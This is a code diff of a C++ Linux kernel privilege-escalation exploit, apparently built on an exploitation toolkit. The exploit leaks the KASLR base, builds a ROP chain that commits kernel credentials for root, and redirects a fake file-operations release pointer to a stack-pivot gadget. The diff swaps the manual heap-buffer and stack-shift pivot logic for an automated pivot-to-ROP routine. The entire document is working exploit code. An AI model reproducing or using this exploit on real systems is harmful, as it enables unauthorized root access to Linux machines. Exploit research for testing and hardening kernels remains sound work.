@@ -48,11 +48,6 @@ uint64_t alloc_victim_pipe(pipefds pipefds) {
     return pipe_addr;
 }
 
-uint64_t alloc_heap_buf(uint64_t size) {
-    Kpwn kpwn;
-    return kpwn.AllocBuffer(size, true);
-}
-
 std::vector<uint8_t> trigger_vuln_arb_read(uint64_t addr, uint64_t size) {
     Kpwn kpwn;
     return kpwn.Read(addr, size);
@@ -64,8 +59,6 @@ void trigger_vuln_arb_write(uint64_t addr, const std::vector<uint8_t>& data) {
 }
 
 int main(int argc, const char** argv) {
-    bool use_heap_buffer = ArgumentParser(argc, argv).hasOption("use-heap-buffer");
-
     KpwnParser kpwn_db(target_db, target_db_size);
     auto target = kpwn_db.AutoDetectTarget();
     printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());
@@ -83,12 +76,6 @@ int main(int argc, const char** argv) {
     printf("[+] KASLR base = 0x%lx\n", kaslr_base);
     check_kaslr_base(kaslr_base);
 
-    uint64_t heap_addr = 0;
-    if (use_heap_buffer) {
-        heap_addr = alloc_heap_buf(128);
-        printf("[+] Heap addr = 0x%lx\n", heap_addr);
-    }
-
     printf("[+] ROP chain:\n");
     RopChain rop(kaslr_base);
     target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
@@ -104,44 +91,15 @@ int main(int argc, const char** argv) {
     auto release_ptr = (uint64_t*)payload.Reserve(fake_ops_offs + release_offs, 8);
 
     PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
-    auto stack_pivot = pivot_finder.Find(use_heap_buffer ? 8 : 0);
-    if (!stack_pivot.has_value())
-        throw ExpKitError("could not find a stack pivot");
+    auto rop_pivot = pivot_finder.PivotToRop(rop);
 
-    printf("[+] Selected stack pivot: %s\n", stack_pivot->GetDescription().c_str());
-    stack_pivot->ApplyToPayload(payload, kaslr_base);
-    *release_ptr = kaslr_base + stack_pivot->GetGadgetOffset();
+    printf("[+] Selected stack pivot: %s\n", rop_pivot.pivot.GetDescription().c_str());
+    *release_ptr = kaslr_base + rop_pivot.pivot.GetGadgetOffset();
 
-    auto stack_pivot_dst = stack_pivot->GetDestinationOffset();
-
-    if (use_heap_buffer) {
-        // puts ROP chain into a separate heap buffer and pivots RSP there
-        auto pop_rsp = pivot_finder.GetPopRsp();
-        if (!pop_rsp.has_value())
-            throw ExpKitError("could not find a pop rsp gadget");
-        printf("[+] Selected POP RSP pivot: stack_change_before_rsp=%lu, next_rip_offset=%lu\n", pop_rsp->stack_change_before_rsp, pop_rsp->next_rip_offset);
-
-        payload.Set(stack_pivot_dst, kaslr_base + pop_rsp->address);
-        payload.Set(stack_pivot_dst + 8, heap_addr);
-
-        printf("[+] Writing ROP chain into heap address\n");
-        trigger_vuln_arb_write(heap_addr, rop.GetData());
-    } else {
-        // Find a shift gadget that shifts stack at least by 0x30
-        auto rop_offs_from = payload.FindEmpty(rop.GetData().size()) - stack_pivot_dst;
-        printf("[.] Trying to find a stack shift at least %lu bytes\n", rop_offs_from);
-
-        auto shift_gadget = pivot_finder.FindShift(rop_offs_from);
-        if (!shift_gadget.has_value())
-            throw ExpKitError("could not find a shift gadget");
-        printf("[+] Selected stack shifting pivot: shift_amount=%lu, ret_offset=%lu\n", shift_gadget->shift_amount, shift_gadget->ret_offset);
-
-        // TODO: make interface more similar, e.g. use GetGadgetOffset()
-        payload.Set(stack_pivot_dst, kaslr_base + shift_gadget->address);
-        // TODO: shifting is weird with this +8 for the current pointer
-        auto rop_offs = stack_pivot_dst + 8 + shift_gadget->ret_offset;
-        payload.Set(rop_offs, rop.GetData());
-    }
+    for (auto& shift : rop_pivot.stack_shift.stack_shifts)
+        printf("[+] Stack jump @0x%lx: 0x%lx -> 0x%lx (size: 0x%lx)\n", shift.pivot.address,
+            shift.from_offset, shift.from_offset + shift.pivot.shift_amount, shift.pivot.shift_amount);
+    printf("[+] ROP chain offset: 0x%lx\n", rop_pivot.rop_offset);
 
     printf("[+] Payload:\n");
     HexDump::Print(payload.GetUsedData());
